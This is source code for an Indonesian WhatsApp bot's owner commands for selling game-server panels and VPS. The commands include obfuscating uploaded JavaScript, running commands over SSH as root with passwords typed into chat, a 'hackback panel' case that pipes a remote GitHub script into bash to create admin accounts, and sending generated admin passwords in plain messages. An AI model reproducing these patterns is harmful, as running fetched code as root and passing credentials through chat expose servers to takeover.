//------(Batas Case)------//
case 'encrypthard': case "enchard": {
if (!m.quoted) return Reply("Reply file .js")
if (mime !== "application/javascript") return Reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await Reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "Crasher" + 
            "Tama";

        function unidentifiedReplacer(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function randomString(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return unidentifiedReplacer(originalString) + randomString(2);
    },
    renameVariables: true,
    renameGlobals: true,
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,
    shuffle: {
        hash: false,
        true: false
    },
    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await TamaMods.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\n Hard Encryption"}, {quoted: pantek})
}).catch(e => Reply("Error :" + e))
}
break
//------(Batas Case)------//
case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return Reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("*Berhasil menjalankan wings 🔥*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
Reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================
case "hbpanel2": case "hackbackpanel2": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return Reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${newuser}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${newpw}\"}`
}]
})
})} 
}}, {userJid: m.chat, quoted: pantek})
await TamaMods.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//------(Batas Case)------//
case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return Reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses 🔥*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await TamaMods.sendMessage(m.chat, {text: teks}, {quoted: pantek})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("hostname|ipserver"))
if (!text.split("|")) return Reply(example("hostname|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname2}\nAuto Create Subdomain`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return Reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return Reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return Reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return Reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await Reply(teks)
} else return Reply(`${e['error']}`)
})
}
break

//================================================================================

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Berhasil membuat admin panel*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await TamaMods.sendMessage(orang, {text: teks}, {quoted: pantek})
}
break
//------(Batas Case)------//
case "cadmin1": {
if (!isCreator) return Reply(mess.owner)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
if (!username) return Reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return Reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username+crypto.randomBytes(2).toString('hex')
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let tks = `
*Succesfully Created Akun Admin Panel*\nData Akun Sudah Dikirim Ke Nomor ${nomornya}
`
    const listMessage = {
        text: tks,
    }
    await TamaMods.sendMessage(m.chat, listMessage)
    await TamaMods.sendMessage(nomornya, {
        text: `*PERMISI PESANAN ADP ANDA TELAH SAMPAI 📦*
‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎

*Berhasil Membuat Admin Panel*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name} ${user.last_name}
* *username :* ${user.username}
* *pasword :* ${password.toString()}
* *login :* ${global.domain}

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬
╎ *MASA AKTIF* = 30 HARI
╎ *GARANSI* = 10 HARI
╎ *TUTOR* = ${linktutor}
╎ *SOSMED* = ${sosmed}
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*Rules Admin Panel ⚠️*
* dilarang intip panel orang
* dilarang otak atik panel
* dilarang ganti nama panel
* dilarang ambil sc orang
* dilarang create admin panel
* dilarang otak atik nodejs
* dilarang otak atik apa pun
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian.
KALO GA PAHAM, LIAT YT, JANGAN NEKAT 
BIKIN ASAL ASALAN. KARENA KALO SALAH,
BAKALAN DI DELETE. TRX NO REFF NO DRAMA


*NOTE* :
*OWNER HANYA MENGIRIM 1X DATA AKUN ANDA. MOHON DI SIMPAN BAIK BAIK. KALAU DATA AKUN ANDA HILANG. OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*

`,
})
} 
        break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Berhasil membuat admin panel*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await TamaMods.sendMessage(orang, {text: teks}, {quoted: pantek})
}
break
//------(Batas Case)------//
case "cadmin1-v2": {
if (!isCreator) return Reply(mess.owner)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
if (!username) return Reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return Reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username+crypto.randomBytes(2).toString('hex')
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let tks = `
*Succesfully Created Akun Admin Panel*\nData Akun Sudah Dikirim Ke Nomor ${nomornya}
`
    const listMessage = {
        text: tks,
    }
    await TamaMods.sendMessage(m.chat, listMessage)
    await TamaMods.sendMessage(nomornya, {
        text: `*PERMISI PESANAN ADP ANDA TELAH SAMPAI 📦*
‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎

*Berhasil Membuat Admin Panel*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name} ${user.last_name}
* *username :* ${user.username}
* *pasword :* ${password.toString()}
* *login :* ${global.domainV2}

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬
╎ *MASA AKTIF* = 30 HARI
╎ *GARANSI* = 10 HARI
╎ *TUTOR* = ${linktutor}
╎ *SOSMED* = ${sosmed}
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*Rules Admin Panel ⚠️*
* dilarang intip panel orang
* dilarang otak atik panel
* dilarang ganti nama panel
* dilarang ambil sc orang
* dilarang create admin panel
* dilarang otak atik nodejs
* dilarang otak atik apa pun
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian.
KALO GA PAHAM, LIAT YT, JANGAN NEKAT 
BIKIN ASAL ASALAN. KARENA KALO SALAH,
BAKALAN DI DELETE. TRX NO REFF NO DRAMA


*NOTE* :
*OWNER HANYA MENGIRIM 1X DATA AKUN ANDA. MOHON DI SIMPAN BAIK BAIK. KALAU DATA AKUN ANDA HILANG. OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*

`,
})
} 
        break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("cmd|responnya"))
if (!text.split("|")) return Reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return Reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return Reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./Access/database/list.json", JSON.stringify(list, null, 2))
Reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return Reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./Access/database/list.json", JSON.stringify(list, null, 2))
Reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return Reply("Tidak ada cmd respon")
let teks = "\n *[ ! ] List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
Reply(`${teks}`)
}
break

//================================================================================

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return Reply(`\`Example:\` : ${prefix+command} 628×××`)
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || seller.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi reseller!`)
seller.push(input)
await fs.writeFileSync("./Access/database/reseller.json", JSON.stringify(seller, null, 2))
Reply(`Succesfully Add Reseller`)
}
break
//------(Batas Case)------//
case "addseller-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return Reply(`\`Example:\` : ${prefix+command} 628×××`)
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || sellerr.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi reseller!`)
sellerr.push(input)
await fs.writeFileSync("./Access/database/resellerr.json", JSON.stringify(sellerr, null, 2))
Reply(`Succesfully Add Reseller`)
}
break

//================================================================================

case "listseller": {
if (!isCreator) return Reply(mess.owner)
if (seller.length < 1) return Reply("Tidak ada user reseller")
let teks = `\n *🌟 List all reseller panel*\n`
for (let i of seller) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
TamaMods.sendMessage(m.chat, {text: teks, mentions: seller}, {quoted: pantek})
}
break
//------(Batas Case)------//
case "listseller-v2": {
if (!isCreator) return Reply(mess.owner)
if (sellerr.length < 1) return Reply("Tidak ada user reseller server 2")
let teks = `\n *🌟 List all reseller panel v2*\n`
for (let i of sellerr) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
TamaMods.sendMessage(m.chat, {text: teks, mentions: sellerr}, {quoted: pantek})
}
break

//================================================================================

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Reply(`\`Example:\` : ${prefix+command} 628×××`)
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return Reply(`Tidak bisa menghapus owner!`)
if (!seller.includes(input)) return Reply(`Nomor ${input2} bukan reseller!`)
let posi = seller.indexOf(input)
await seller.splice(posi, 1)
await fs.writeFileSync("./Access/database/reseller.json", JSON.stringify(seller, null, 2))
Reply(`Succesfully Delete Reseller`)
}
break
//------(Batas Case)------//
case "delseller-v2": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Reply(`\`Example:\` : ${prefix+command} 628×××`)
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return Reply(`Tidak bisa menghapus owner!`)
if (!sellerr.includes(input)) return Reply(`Nomor ${input2} bukan reseller!`)
let posi = sellerr.indexOf(input)
await sellerr.splice(posi, 1)
await fs.writeFileSync("./Access/database/resellerr.json", JSON.stringify(sellerr, null, 2))
Reply(`Succesfully Delete Reseller`)
}
break

//================================================================================




case "buyvps": {
if (m.isGroup) return Reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16 & Cpu 4', 
                  description: "Rp60.000", 
                  id: '.buyvps 4'
                },
                {
                  title: 'Ram 2 & Cpu 1', 
                  description: "Rp30.000", 
                  id: '.buyvps 1'
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp40.000", 
                  id: '.buyvps 2'
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp50.000", 
                  id: '.buyvps 3'
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${global.botname2}\nAuto Order Vps`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "30000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "40000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "50000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "60000"
    } else return Reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
